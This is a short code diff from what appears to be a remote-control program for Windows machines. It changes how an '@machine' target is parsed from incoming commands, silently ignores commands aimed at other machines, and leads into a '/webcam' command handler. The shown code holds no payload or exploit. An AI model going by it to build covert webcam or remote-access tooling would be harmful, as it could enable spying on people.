@@ -793,20 +793,15 @@ def execute_command(command, message=None):
     state = load_state()
     my_name = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
     
-    parts = raw_cmd.split()
-    cleaned_parts = []
-    for part in parts:
-        if part.startswith("@"):
-            target_machine = part[1:].strip().lower()
-        else:
-            cleaned_parts.append(part)
-            
+    if "@" in raw_cmd:
+        cmd_part, target_part = raw_cmd.rsplit("@", 1)
+        target_machine = target_part.strip().lower()
+        command = cmd_part.strip()
+        
     if target_machine is not None:
         if target_machine != my_name.lower():
             # Silently ignore as it is targeted for another machine
             return
-        # Rebuild command without the target suffix
-        command = " ".join(cleaned_parts)
         
     cmd = command.strip().lower()
     if cmd in ["/webcam", "webcam"]:
